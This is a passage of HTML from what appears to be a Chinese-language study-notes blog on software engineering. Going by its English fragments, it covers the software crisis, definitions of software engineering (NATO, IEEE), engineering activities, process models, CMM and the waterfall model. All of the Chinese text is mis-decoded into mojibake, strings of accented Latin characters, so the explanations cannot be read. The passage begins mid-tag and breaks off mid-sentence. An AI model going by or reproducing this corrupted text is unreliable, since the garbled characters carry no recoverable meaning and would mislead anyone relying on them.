href="#è½¯ä»¶çš„å˜æ›´æœ¬è´¨" class="headerlink" title="è½¯ä»¶çš„å˜æ›´æœ¬è´¨"></a>è½¯ä»¶çš„å˜æ›´æœ¬è´¨</h2><p>å››å¤§ç±»è½¯ä»¶ä¸æ–­æ¼”åŒ–ï¼Œåœ¨è¡Œä¸šä¸­å æœ‰ä¸»å¯¼åœ°ä½ã€‚è¿™å››ç±»è½¯ä»¶åœ¨åå‡ å¹´å‰è¿˜å¤„äºåˆçº§é˜¶æ®µ</p><ul><li><strong>WebApp</strong>â€”â€”åŸºäºWebçš„ç³»ç»Ÿå’Œåº”ç”¨è½¯ä»¶</li><li><strong>ç§»åŠ¨App</strong>â€”â€”é€šå¸¸åŒ…æ‹¬ç”¨æˆ·æ¥å£ã€ç”¨æˆ·æ¥å£åˆ©ç”¨ç§»åŠ¨å¹³å°æ‰€æä¾›çš„ç‹¬ç‰¹äº¤äº’æœºåˆ¶ï¼ŒåŸºäºWebèµ„æºçš„äº’æ“ä½œæ€§æä¾›æ–¹ä¸Appç›¸å…³çš„å¤§é‡ä¿¡æ¯çš„è®¿é—®ï¼Œå¹¶å…·æœ‰æœ¬åœ°å¤„ç†èƒ½åŠ›ï¼Œä»¥æœ€é€‚åˆç§»åŠ¨å¹³å°çš„æ–¹å¼æ”¶é›†ã€åˆ†æå’Œæ ¼å¼åŒ–ä¿¡æ¯</li><li><strong>äº‘è®¡ç®—</strong>â€”â€”åŒ…æ‹¬åŸºç¡€è®¾æ–½æˆ–â€ç”Ÿæ€ç³»ç»Ÿâ€ï¼Œèƒ½ä½¿å¾—ä»»ä½•ç”¨æˆ·åœ¨ä»»ä½•åœ°ç‚¹éƒ½å¯ä»¥ä½¿ç”¨è®¡ç®—è®¾å¤‡æ¥å…±äº«å¹¿æ³›çš„è®¡ç®—èµ„æºã€‚</li><li><strong>äº§å“çº¿è½¯ä»¶</strong>â€”â€”ä¸€ç³»åˆ—è½¯ä»¶å¯†é›†å‹ç³»ç»Ÿå¯ä»¥ï¼Œå¯ä»¥å…±äº«ä¸€ç»„å…¬å…±çš„å¯ç®¡ç†çš„ç‰¹æ€§ï¼Œè¿™äº›ç‰¹æ€§å¯ä»¥æ»¡è¶³ç‰¹å®šå¸‚åœºæˆ–ä»»åŠ¡çš„ç‰¹å®šéœ€æ±‚ï¼Œå¹¶ä»¥é¢„å®šçš„æ–¹æ³•ä»ä¸€ç»„å…¬å…±çš„æ ¸å¿ƒèµ„æºå¼€å‘å‡ºæ¥ã€‚</li></ul><h1 id="è½¯ä»¶å·¥ç¨‹"><a href="#è½¯ä»¶å·¥ç¨‹" class="headerlink" title="è½¯ä»¶å·¥ç¨‹"></a>è½¯ä»¶å·¥ç¨‹</h1><h2 id="è½¯ä»¶å±æœº"><a href="#è½¯ä»¶å±æœº" class="headerlink" title="è½¯ä»¶å±æœº"></a>è½¯ä»¶å±æœº</h2><p>è½¯ä»¶å±æœºæ˜¯ï¼šåœ¨è®¡ç®—æœºè½¯ä»¶çš„<strong>å¼€å‘å’Œç»´æŠ¤</strong>è¿‡ç¨‹ä¸­æ‰€é‡åˆ°çš„ä¸€ç³»åˆ—ä¸¥é‡é—®é¢˜(æ•ˆç‡å’Œè´¨é‡ä¸‹é™)ã€‚</p><ul><li>é¡¹ç›®è¶…å‡ºé¢„ç®—</li><li>é¡¹ç›®è¶…è¿‡è®¡åˆ’å®Œæˆæ—¶é—´</li><li>è½¯ä»¶è¿è¡Œæ•ˆç‡å¾ˆä½</li><li>è½¯ä»¶è´¨é‡å·®</li><li>è½¯ä»¶é€šå¸¸ä¸ç¬¦åˆè¦æ±‚</li><li>é¡¹ç›®éš¾ä»¥ç®¡ç†å¹¶ä¸”ä»£ç éš¾ä»¥ç»´æŠ¤</li><li>è½¯ä»¶ä¸èƒ½äº¤ä»˜</li></ul><h3 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h3><ul><li>å®¢è§‚ï¼šè½¯ä»¶æœ¬èº«ç‰¹ç‚¹<ul><li>é€»è¾‘éƒ¨ä»¶è§„æ¨¡åºå¤§</li></ul></li><li>ä¸»è§‚ï¼šä¸æ­£ç¡®çš„å¼€å‘æ–¹å¼<ul><li>å¿½ç•¥éœ€æ±‚åˆ†æ</li><li>é”™è¯¯è®¤ä¸ºï¼šè½¯ä»¶å¼€å‘&#x3D;ç¨‹åºç¼–å†™</li><li>è½»è§†è½¯ä»¶ç»´æŠ¤</li></ul></li></ul><p>æ¶ˆé™¤è½¯ä»¶å±æœºçš„é€”å¾„ï¼š<strong>è½¯ä»¶å·¥ç¨‹</strong>ï¼</p><h2 id="è½¯ä»¶å·¥ç¨‹-1"><a href="#è½¯ä»¶å·¥ç¨‹-1" class="headerlink" title="è½¯ä»¶å·¥ç¨‹"></a>è½¯ä»¶å·¥ç¨‹</h2><h3 id="è½¯ä»¶å·¥ç¨‹å®šä¹‰"><a href="#è½¯ä»¶å·¥ç¨‹å®šä¹‰" class="headerlink" title="è½¯ä»¶å·¥ç¨‹å®šä¹‰"></a>è½¯ä»¶å·¥ç¨‹å®šä¹‰</h3><blockquote><p>è½¯ä»¶å·¥ç¨‹æ¦‚å¿µçš„æå‡ºï¼šç›®çš„æ˜¯å€¡å¯¼ä»¥å·¥ç¨‹çš„åŸç†ã€åŸåˆ™å’Œæ–¹æ³•è¿›è¡Œè½¯ä»¶å¼€å‘ï¼Œä»¥è§£å†³è½¯ä»¶å±æœºã€‚</p></blockquote><ul><li><p>è®¡ç®—æœºç™¾ç§‘å…¨ä¹¦ä¸Šçš„è½¯ä»¶å·¥ç¨‹å®šä¹‰ï¼š</p><p>åº”ç”¨è®¡ç®—æœºç§‘å­¦ã€æ•°å­¦åŠç®¡ç†ç§‘å­¦ç­‰åŸç†ï¼Œä»¥å·¥ç¨‹åŒ–æ–¹æ³•åˆ¶ä½œè½¯ä»¶çš„å·¥ç¨‹ã€‚å®ƒå€Ÿé‰´ä¼ ç»Ÿå·¥ç¨‹çš„åŸåˆ™ã€æ–¹æ³•ï¼Œåˆ›å»ºè½¯ä»¶ä»¥è¾¾åˆ°æé«˜è´¨é‡ï¼Œé™ä½æˆæœ¬çš„ç›®çš„ã€‚</p><p>å…¶ä¸­ï¼Œè®¡ç®—æœºç§‘å­¦ã€æ•°å­¦ç”¨äºæ„å»ºæ¨¡å‹ä¸ç®—æ³•ï¼Œå·¥ç¨‹ç§‘å­¦ç”¨äºæŒ‡å®šè§„èŒƒã€è®¾è®¡èŒƒå‹ã€è¯„ä¼°æˆæœ¬åŠç¡®å®šæƒè¡¡ï¼Œç®¡ç†ç§‘å­¦ç”¨äºè®¡åˆ’ã€èµ„æºè´¨é‡ã€æˆæœ¬ç­‰ç®¡ç†ã€‚</p><p>è½¯ä»¶å·¥ç¨‹æ˜¯ä¸€é—¨æŒ‡å¯¼è®¡ç®—æœºè½¯ä»¶å¼€å‘å’Œç»´æŠ¤çš„å·¥ç¨‹å­¦ç§‘ã€‚è½¯ä»¶å·¥ç¨‹æ˜¯ä¸€é—¨äº¤å‰æ€§å­¦ç§‘ã€‚</p></li><li><p>é¦–æ¬¡NATOä¼šè®®ä¸Šçš„è½¯ä»¶å·¥ç¨‹å®šä¹‰ï¼š</p><p>è½¯ä»¶å·¥ç¨‹æ˜¯ç”¨æ¥å»ºç«‹å’Œä½¿ç”¨åˆç†çš„å·¥ç¨‹åŸåˆ™ï¼Œä»¥ç»æµåœ°è·å–å¯é çš„ã€ä¸”åœ¨çœŸå®æœºå™¨ä¸Šå¯é«˜æ•ˆå·¥ä½œçš„è½¯ä»¶ã€‚</p></li><li><p>IEEE[IEE93]ä¸­çš„è½¯ä»¶å·¥ç¨‹å®šä¹‰ï¼š</p><p>(1) å°†ç³»ç»ŸåŒ–çš„ã€è§„èŒƒçš„ã€å¯é‡åŒ–çš„æ–¹æ³•åº”ç”¨äºè½¯ä»¶çš„å¼€å‘ã€è¿è¡Œå’Œç»´æŠ¤ï¼Œå³ å°†å·¥ç¨‹åŒ–æ–¹æ³•åº”ç”¨äºè½¯ä»¶ï¼›</p><p>(2) å¯¹ (1) ä¸­æ‰€è¿°æ–¹æ³•çš„ç ”ç©¶ã€‚</p><p>ç›®æ ‡æ˜¯åœ¨ç»™å®šçš„é¢„ç®—å†…ï¼ŒæŒ‰ç…§ç”¨æˆ·çš„éœ€æ±‚ï¼Œå¼€å‘æ˜“ä¿®æ”¹ã€é«˜æ•ˆã€å¯é ã€å¯ç»´æŠ¤ã€é€‚åº”åŠ›å¼ºã€å¯ç§»åŠ¨ã€å¯é‡ç”¨çš„è½¯ä»¶ã€‚</p></li></ul><h3 id="è½¯ä»¶å·¥ç¨‹æ¡†æ¶"><a href="#è½¯ä»¶å·¥ç¨‹æ¡†æ¶" class="headerlink" title="è½¯ä»¶å·¥ç¨‹æ¡†æ¶"></a>è½¯ä»¶å·¥ç¨‹æ¡†æ¶</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103193713871.png" alt="image-20240103193713871" style="zoom:50%;" /><p>è½¯ä»¶å·¥ç¨‹å¯å®šä¹‰ä¸ºä¸‰å…ƒç»„ï¼š&lt;ç›®æ ‡ï¼ŒåŸåˆ™ï¼Œæ´»åŠ¨&gt;</p><ul><li>ç»™å‡ºäº†è½¯ä»¶æ‰€æ¶‰åŠè½¯ä»¶å·¥ç¨‹çš„å·¥ç¨‹è¦ç´ </li><li>ç»™å‡ºäº†å„è¦ç´ ä¹‹é—´çš„å…³ç³»</li><li>ç»™å‡ºäº†è½¯ä»¶å·¥ç¨‹å­¦ç§‘æ‰€ç ”ç©¶çš„ä¸»è¦å†…å®¹</li></ul><h3 id="è½¯ä»¶å·¥ç¨‹ç›®æ ‡"><a href="#è½¯ä»¶å·¥ç¨‹ç›®æ ‡" class="headerlink" title="è½¯ä»¶å·¥ç¨‹ç›®æ ‡"></a>è½¯ä»¶å·¥ç¨‹ç›®æ ‡</h3><p>ç›®æ ‡ï¼šç”Ÿäº§å…·æœ‰æ­£ç¡®æ€§ã€å¯ç”¨æ€§ä»¥åŠå¼€é”€åˆç›Šçš„äº§å“ã€‚</p><ul><li>æ­£ç¡®æ€§ï¼šæ„æŒ‡è½¯ä»¶äº§å“è¾¾åˆ°é¢„æœŸåŠŸèƒ½çš„ç¨‹åº¦</li><li>å¯ç”¨æ€§ï¼šæ„æŒ‡è½¯ä»¶åŸºæœ¬ç»“æ„ã€å®ç°åŠæ–‡æ¡£ä¸ºç”¨æˆ·å¯ç”¨çš„ç¨‹åº¦</li><li>å¼€é”€åˆç›Šï¼šæŒ‡è½¯ä»¶å¼€å‘ã€è¿è¡Œçš„æ•´ä¸ªå¼€é”€æ»¡è¶³ç”¨æˆ·è¦æ±‚çš„ç¨‹åº¦</li></ul><h3 id="è½¯ä»¶å·¥ç¨‹çš„æ´»åŠ¨"><a href="#è½¯ä»¶å·¥ç¨‹çš„æ´»åŠ¨" class="headerlink" title="è½¯ä»¶å·¥ç¨‹çš„æ´»åŠ¨"></a>è½¯ä»¶å·¥ç¨‹çš„æ´»åŠ¨</h3><p>æ´»åŠ¨ï¼šç”Ÿäº§ä¸€ä¸ªæœ€ç»ˆæ»¡è¶³è¦æ±‚ä¸”è¾¾åˆ°å·¥ç¨‹ç›®æ ‡çš„è½¯ä»¶äº§å“æ‰€éœ€è¦çš„æ­¥éª¤</p><ul><li>ä¸»è¦åŒ…æ‹¬ï¼š&#x3D;&#x3D;éœ€æ±‚ã€è®¾è®¡ã€å®ç°ã€ç¡®è®¤å’Œæ”¯æŒ&#x3D;&#x3D;ç­‰æ´»åŠ¨ã€‚</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103200135300.png" alt="image-20240103200135300" style="zoom:33%;" /><h4 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h4><p>å®šä¹‰é—®é¢˜ï¼šå³å»ºç«‹ç³»ç»Ÿæ¨¡å‹</p><p>ä¸»è¦ä»»åŠ¡åŒ…æ‹¬ï¼š</p><ul><li><p>éœ€æ±‚è·å–</p></li><li><p>éœ€æ±‚å®šä¹‰(å³å®šä¹‰é—®é¢˜)ç³»ç»ŸåŠŸèƒ½çš„ä¸€ä¸ªæ­£ç¡®çš„é™ˆè¿°</p></li><li><p>éœ€æ±‚è§„çº¦ï¼šç³»ç»Ÿéœ€æ±‚è§„æ ¼è¯´æ˜    ã€‹ä¸»è¦æˆåˆ†ï¼šç³»ç»Ÿæ¨¡å‹ç³»ç»ŸåŠŸèƒ½çš„ä¸€ä¸ªç²¾ç¡®ã€ç³»ç»Ÿçš„æè¿°ã€‚</p></li><li><p>éœ€æ±‚éªŒè¯:éªŒè¯éœ€æ±‚é™ˆè¿°å’Œéœ€æ±‚è§„çº¦ä¹‹é—´çš„ä¸€è‡´æ€§ã€å®Œæ•´æ€§å’Œå¯è·Ÿè¸ªæ€§ã€‚</p></li></ul><h4 id="è®¾è®¡"><a href="#è®¾è®¡" class="headerlink" title="è®¾è®¡"></a>è®¾è®¡</h4><p>åœ¨éœ€æ±‚åˆ†æçš„åŸºç¡€ä¸Šï¼Œç»™å‡ºç³»ç»Ÿçš„è½¯ä»¶è®¾è®¡æ–¹æ¡ˆã€‚</p><p>è®¾è®¡åŒ…æ‹¬ï¼šæ€»ä½“è®¾è®¡(ä¹Ÿç§°ä¸ºæ¦‚è¦è®¾è®¡)å’Œè¯¦ç»†è®¾è®¡</p><ul><li>æ€»ä½“è®¾è®¡ï¼šå»ºç«‹æ•´ä¸ªè½¯ä»¶ä½“ç³»ç»“æ„<ul><li>åŒ…æ‹¬å­ç³»ç»Ÿã€æ¨¡å—(æˆ–æ„ä»¶)ä»¥åŠç›¸å…³å±‚æ¬¡çš„è¯´æ˜ã€æ¯ä¸€æ¨¡å—(æˆ–æ„ä»¶)çš„æ¥å£å®šä¹‰ã€‚</li><li>ä½“ç³»ç»“æ„ç±»å‹å¯åˆ†ä¸ºï¼šå±‚æ¬¡æ¨¡å—ä½“ç³»ç»“æ„ã€C&#x2F;Sä½“ç³»ç»“æ„ã€ä»¥æ•°æ®åº“ä¸ºä¸­å¿ƒçš„ä½“ç³»ç»“æ„ã€ç®¡é“ç»“æ„å’Œé¢å‘å¯¹è±¡çš„ç»“æ„ç­‰</li></ul></li><li>è¯¦ç»†è®¾è®¡ï¼šé’ˆå¯¹æ€»ä½“è®¾è®¡çš„ç»“æœï¼Œç»™å‡ºä½“ç³»ç»“æ„ä¸­æ¯ä¸€æ¨¡å—æˆ–æ„ä»¶çš„è¯¦ç»†æè¿°<ul><li>å³ç»™å‡ºå®ƒä»¬çš„æ•°æ®ç»“æ„è¯´æ˜å’Œå®ç°ç®—æ³•</li></ul></li></ul><h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><p>æŠŠè®¾è®¡ç»“æœè½¬æ¢ä¸ºå¯æ‰§è¡Œçš„ç¨‹åºä»£ç </p><p>å…·ä½“åšæ³•åˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li>é€‰æ‹©å¯ç”¨çš„æ¨¡å—æˆ–æ„ä»¶æˆ–ä»¥ä¸€ç§é€‰å®šçš„è¯­è¨€ï¼Œå¯¹æ¯ä¸€æ¨¡å—æˆ–æ„ä»¶è¿›è¡Œç¼–ç </li></ul><h4 id="ç¡®è®¤"><a href="#ç¡®è®¤" class="headerlink" title="ç¡®è®¤"></a>ç¡®è®¤</h4><p>ç¡®è®¤æ´»åŠ¨è´¯ç©¿äºæ•´ä¸ªå¼€å‘è¿‡ç¨‹</p><p>å®ç°å®Œæˆåçš„ç¡®è®¤ï¼Œç¡®ä¿æœ€ç»ˆäº§å“æ»¡è¶³ç”¨æˆ·çš„éœ€æ±‚ã€‚</p><p>ç¡®è®¤æ´»åŠ¨ä¸»è¦åŒ…å«ï¼šéœ€æ±‚å¤å®¡ã€è®¾è®¡å¤å®¡ä»¥åŠç¨‹åºæµ‹è¯•ã€‚ä¸»è¦ä»»åŠ¡æ˜¯ï¼šè½¯ä»¶æµ‹è¯•ã€‚</p><h4 id="æ”¯æŒ"><a href="#æ”¯æŒ" class="headerlink" title="æ”¯æŒ"></a>æ”¯æŒ</h4><p>æ”¯æŒæ´»åŠ¨åŒ…æ‹¬ä¿®æ”¹å’Œå®Œå–„</p><p>å®ƒä¸ºç³»ç»Ÿçš„è¿è¡Œæä¾›å®Œå–„æ€§ç»´æŠ¤ã€çº é”™æ€§ç»´æŠ¤å’Œé€‚åº”æ€§ç»´æŠ¤ã€‚</p><h1 id="è½¯ä»¶è¿‡ç¨‹"><a href="#è½¯ä»¶è¿‡ç¨‹" class="headerlink" title="è½¯ä»¶è¿‡ç¨‹"></a>è½¯ä»¶è¿‡ç¨‹</h1><h3 id="è½¯ä»¶ç”Ÿå‘½å‘¨æœŸ"><a href="#è½¯ä»¶ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="è½¯ä»¶ç”Ÿå‘½å‘¨æœŸ"></a>è½¯ä»¶ç”Ÿå‘½å‘¨æœŸ</h3><p>å®šä¹‰ï¼šè½¯ä»¶äº§å“æˆ–è½¯ä»¶ç³»ç»Ÿä»è®¾è®¡ã€æŠ•å…¥ä½¿ç”¨åˆ°è¢«æ·˜æ±°çš„å…¨è¿‡ç¨‹ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103202123887.png" alt="image-20240103202123887" style="zoom: 33%;" /><h3 id="è½¯ä»¶è¿‡ç¨‹-1"><a href="#è½¯ä»¶è¿‡ç¨‹-1" class="headerlink" title="è½¯ä»¶è¿‡ç¨‹"></a>è½¯ä»¶è¿‡ç¨‹</h3><p>è½¯ä»¶è¿‡ç¨‹æ˜¯åœ¨å·¥ä½œäº§å“æ„å»ºè¿‡ç¨‹ä¸­ï¼Œä¸ºåˆ›å»ºé«˜è´¨é‡è½¯ä»¶æ‰€éœ€å®Œæˆçš„å·¥ä½œ<strong>æ´»åŠ¨ã€åŠ¨ä½œå’Œä»»åŠ¡</strong>çš„é›†åˆ(æ¡†æ¶)ã€‚</p><p>&#x3D;&#x3D;æ´»åŠ¨&#x3D;&#x3D;ä¸»è¦å®ç°å®½æ³›çš„ç›®æ ‡ï¼Œä¸åº”ç”¨é¢†åŸŸã€é¡¹ç›®å¤§å°ã€ç»“æœå¤æ‚æ€§æˆ–è€…å®æ–½è½¯ä»¶å·¥ç¨‹çš„é‡è¦ç¨‹åº¦æ²¡æœ‰ç›´æ¥å…³ç³»</p><p>&#x3D;&#x3D;åŠ¨ä½œ&#x3D;&#x3D;åŒ…å«äº†ä¸»è¦å·¥ä½œäº§å“ç”Ÿäº§è¿‡ç¨‹ä¸­çš„ä¸€ç³»åˆ—ä»»åŠ¡</p><p>&#x3D;&#x3D;ä»»åŠ¡&#x3D;&#x3D;å…³æ³¨å°è€Œæ˜ç¡®çš„ç›®æ ‡ï¼Œèƒ½å¤Ÿäº§ç”Ÿå®é™…äº§å“ã€‚</p><h3 id="è½¯ä»¶è¿‡ç¨‹æ¨¡å‹"><a href="#è½¯ä»¶è¿‡ç¨‹æ¨¡å‹" class="headerlink" title="è½¯ä»¶è¿‡ç¨‹æ¨¡å‹"></a>è½¯ä»¶è¿‡ç¨‹æ¨¡å‹</h3><p>æœ€æ—©æå‡ºè¿‡ç¨‹æ¨¡å‹æ˜¯ä¸ºäº†æ”¹å˜è½¯ä»¶å¼€å‘çš„æ··ä¹±çŠ¶æ€ï¼Œä½¿è½¯ä»¶å¼€å‘æ›´åŠ æœ‰åºã€‚å†å²è¯æ˜ï¼Œè¿™äº›æ¨¡å‹ä¸ºè½¯ä»¶è¿‡ç¨‹æå‡ºäº†å¤§é‡æœ‰ç”¨çš„ç»“æ„ï¼Œå¹¶ä¸ºè½¯ä»¶å›¢é˜Ÿæä¾›äº†æœ‰æ•ˆçš„è·¯çº¿å›¾ã€‚</p><p>åœ¨ä¸€ç¯‡æ¢è®¨<strong>è½¯ä»¶ä¸–ç•Œä¸­æœ‰åºå’Œæ··ä¹±ä¹‹é—´å¥‡æ€ªå…³ç³»</strong>çš„è®ºæ–‡ä¸­æŒ‡å‡ºï¼š</p><blockquote><p>æ··ä¹±çš„è¾¹ç¼˜å¯å®šä¹‰ä¸ºâ€æœ‰åºå’Œæ··ä¹±ä¹‹é—´çš„ä¸€ç§è‡ªç„¶çŠ¶æ€ï¼Œç»“æ„åŒ–å’Œåå¸¸ä¹‹é—´çš„é‡å¤§å¦¥åã€‚â€œæ··ä¹±çš„è¾¹ç¼˜å¯ä»¥è¢«è§†ä¸ºä¸€ç§ä¸ç¨³å®šå’Œéƒ¨åˆ†ç»“æ„åŒ–çš„çŠ¶æ€Â·Â·Â·Â·Â·Â·å®ƒçš„ä¸ç¨³å®šæ˜¯å› ä¸ºå®ƒä¸åœçš„å—åˆ°æ··ä¹±æˆ–è€…å®Œå…¨æœ‰åºçš„å½±å“</p><p>æˆ‘ä»¬é€šå¸¸è®¤ä¸ºæœ‰åºæ˜¯è‡ªç„¶çš„å®Œç¾çŠ¶æ€ã€‚è¿™å¯èƒ½æ˜¯ä¸ªè¯¯åŒºÂ·Â·Â·Â·Â·Â·ç ”ç©¶è¯å®ï¼Œæ‰“ç ´å¹³è¡¡çš„æ´»åŠ¨ä¼šäº§ç”Ÿåˆ›é€ åŠ›ã€è‡ªæˆ‘ç»„ç»‡çš„è¿‡ç¨‹å’Œæ›´é«˜çš„å›æŠ¥ã€‚å®Œå…¨çš„æœ‰åºæ„å‘³ç€ç¼ºä¹å¯å˜æ€§è€Œå¯å˜æ€§åœ¨æŸäº›ä¸å¯é¢„æµ‹çš„ç¯å¢ƒä¸‹å¾€å¾€æ˜¯ä¸€ç§ä¼˜åŠ¿ã€‚å˜æ›´é€šå¸¸å‘ç”Ÿåœ¨æŸäº›ç»“æ„ä¸­ï¼Œè¿™äº›ç»“æ„ä½¿å¾—å˜æ›´å¯ä»¥è¢«æœ‰æ•ˆç»„ç»‡ï¼Œä½†è¿˜ä¸æ˜¯æ­»æ¿å¾—ä½¿å¾—å˜æ›´æ— æ³•å‘ç”Ÿã€‚å¦ä¸€æ–¹é¢ï¼Œå¤ªå¤šçš„æ··ä¹±ä¼šä½¿åè°ƒå’Œä¸€è‡´æˆä¸ºä¸å¯èƒ½ã€‚ç¼ºå°‘ç»“æ„å¹¶ä¸æ„å‘³ç€æ— åºã€‚</p></blockquote><p>æœ¬ç« æ‰€æè¿°çš„æ¯ä¸€ä¸ªè¿‡ç¨‹æ¨¡å‹éƒ½**&#x3D;&#x3D;è¯•å›¾åœ¨æ‰¾å‡ºæ··ä¹±ä¸–ç•Œä¸­çš„ç§©åºå’Œé€‚åº”ä¸æ–­å‘ç”Ÿçš„å˜åŒ–è¿™ä¸¤ç§è¦æ±‚ä¹‹é—´å¯»æ±‚å¹³è¡¡ã€‚&#x3D;&#x3D;**</p><h4 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><p>æ˜¯è½¯ä»¶å¼€å‘å…¨éƒ¨è¿‡ç¨‹ã€æ´»åŠ¨å’Œä»»åŠ¡çš„ç»“æ„æ¡†æ¶ã€‚å®ƒèƒ½ç›´è§‚è¡¨è¾¾è½¯ä»¶å¼€å‘å…¨è¿‡ç¨‹ï¼Œæ˜ç¡®è§„å®šè¦å®Œæˆçš„ä¸»è¦æ´»åŠ¨ã€ä»»åŠ¡å’Œå¼€å‘ç­–ç•¥ã€‚</p><p>ä¹Ÿè¢«ç§°ä¸º:</p><ul><li>è½¯ä»¶å¼€å‘æ¨¡å‹</li><li>è½¯ä»¶ç”Ÿå­˜å‘¨æœŸæ¨¡å‹</li><li>è½¯ä»¶å·¥ç¨‹èŒƒå‹</li></ul><h3 id="èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹-CMM"><a href="#èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹-CMM" class="headerlink" title="èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹ CMM"></a>èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹ CMM</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103202847791.png" alt="image-20240103202847791" style="zoom: 33%;" /><h2 id="æƒ¯ç”¨è¿‡ç¨‹æ¨¡å‹"><a href="#æƒ¯ç”¨è¿‡ç¨‹æ¨¡å‹" class="headerlink" title="æƒ¯ç”¨è¿‡ç¨‹æ¨¡å‹"></a>æƒ¯ç”¨è¿‡ç¨‹æ¨¡å‹</h2><p>æƒ¯ç”¨è¿‡ç¨‹æ¨¡å‹åŠ›æ±‚è¾¾åˆ°è½¯ä»¶å¼€å‘çš„ç»“æ„å’Œç§©åºï¼Œå…¶æ´»åŠ¨å’Œä»»åŠ¡éƒ½æ˜¯æŒ‰ç…§è¿‡ç¨‹çš„ç‰¹å®šæŒ‡å¼•é¡ºåºè¿›è¡Œçš„ã€‚</p><p>æ¥ä¸‹æ¥è®¨è®ºçš„è½¯ä»¶è¿‡ç¨‹æ¨¡å‹æ”¯æŒä¹‹å‰æåˆ°çš„è½¯ä»¶è¿‡ç¨‹é€šç”¨æ¡†æ¶æ´»åŠ¨ï¼Œä½†æ˜¯æ¯ä¸€ä¸ªæ¨¡å‹éƒ½å¯¹æ¡†æ¶æ´»åŠ¨æœ‰æ‰€ä¾§é‡ï¼Œå¹¶ä¸”å®šä¹‰äº†ä¸åŒçš„è¿‡ç¨‹æµä»¥ä¸åŒçš„æ–¹å¼æ‰§è¡Œæ¯ä¸€ä¸ªæ¡†æ¶æ´»åŠ¨(ä»¥åŠè½¯ä»¶å·¥ç¨‹åŠ¨ä½œå’Œä»»åŠ¡)</p><h3 id="ç€‘å¸ƒæ¨¡å‹-Waterfall-model"><a href="#ç€‘å¸ƒæ¨¡å‹-Waterfall-model" class="headerlink" title="ç€‘å¸ƒæ¨¡å‹(Waterfall model)"></a>ç€‘å¸ƒæ¨¡å‹(Waterfall model)</h3><ul><li>å¯è¡Œæ€§ç ”ç©¶<ul><li>éœ€æ±‚åˆ†æ<ul><li>æ€»ä½“è®¾è®¡<ul><li>è¯¦ç»†è®¾è®¡<ul><li>ç¼–ç <ul><li>å•å…ƒæµ‹è¯•<ul><li>ç³»ç»Ÿæµ‹è¯•<ul><li>éªŒæ”¶æµ‹è¯•<ul><li>è¿è¡Œä¸ç»´æŠ¤</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h4 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h4><ul><li>ç¬¬ä¸€ä¸ªè½¯ä»¶è¿‡ç¨‹æ¨¡å‹ã€‚æ˜¯ä¸€ç§ä½¿ç”¨å¹¿æ³›ï¼Œä»¥æ–‡æ¡£ä¸ºé©±åŠ¨çš„æ¨¡å‹</li><li>è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸è½¯ä»¶ç”Ÿå‘½å‘¨æœŸä¸€è‡´ï¼šä¹Ÿç§°ä¸º<strong>ç»å…¸ç”Ÿå‘½å‘¨æœŸæ¨¡å‹</strong></li><li>è§„å®šäº†å„é¡¹è½¯ä»¶å·¥ç¨‹æ´»åŠ¨ï¼Œä»¥åŠå®ƒä»¬è‡ªä¸Šè€Œä¸‹ï¼Œç›¸äº’è¡”æ¥çš„å›ºå®šæ¬¡åºï¼Œå¦‚åŒç€‘å¸ƒæµæ°´ï¼Œé€çº§ä¸‹è½</li><li>çº¿æ€§æ¨¡å‹ï¼šé˜¶æ®µå…·æœ‰é¡ºåºæ€§å’Œä¾èµ–æ€§ã€‚æ¨è¿Ÿå®ç°çš„è§‚ç‚¹</li><li>æ¯ä¸ªé˜¶æ®µéƒ½æœ‰ä¸å…¶ç›¸å…³è”çš„é‡Œç¨‹ç¢‘å’Œå¯äº¤ä»˜äº§å“</li><li>æ¯ä¸ªé˜¶æ®µç»“æŸå‰å®Œæˆæ–‡æ¡£å®¡æŸ¥ï¼ŒåŠæ—©æ”¹æ­£é”™è¯¯</li></ul><h4 id="å¾…åé¦ˆçš„ç€‘å¸ƒæ¨¡å‹"><a href="#å¾…åé¦ˆçš„ç€‘å¸ƒæ¨¡å‹" class="headerlink" title="å¾…åé¦ˆçš„ç€‘å¸ƒæ¨¡å‹"></a>å¾…åé¦ˆçš„ç€‘å¸ƒæ¨¡å‹</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103205113008.png" alt="image-20240103205113008" style="zoom:50%;" /><h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><p>&#x3D;&#x3D;å¢åŠ å·¥ä½œé‡&#x3D;&#x3D;</p><p>å„ä¸ªé˜¶æ®µçš„åˆ’åˆ†å®Œå…¨å›ºå®šï¼Œé˜¶æ®µä¹‹é—´äº§ç”Ÿå¤§é‡çš„æ–‡æ¡£ï¼Œæå¤§å¢åŠ äº†å·¥ä½œé‡</p><p>&#x3D;&#x3D;å¼€å‘é£é™©å¤§&#x3D;&#x3D;</p><p>ç”±äºå¼€å‘æ¨¡å‹æ˜¯çº¿æ€§çš„ï¼Œç”¨æˆ·åªæœ‰ç­‰åˆ°æ•´ä¸ªè¿‡ç¨‹çš„æœ«æœŸæ‰èƒ½è§åˆ°å¼€å‘æˆæœï¼Œä»è€Œå¢åŠ 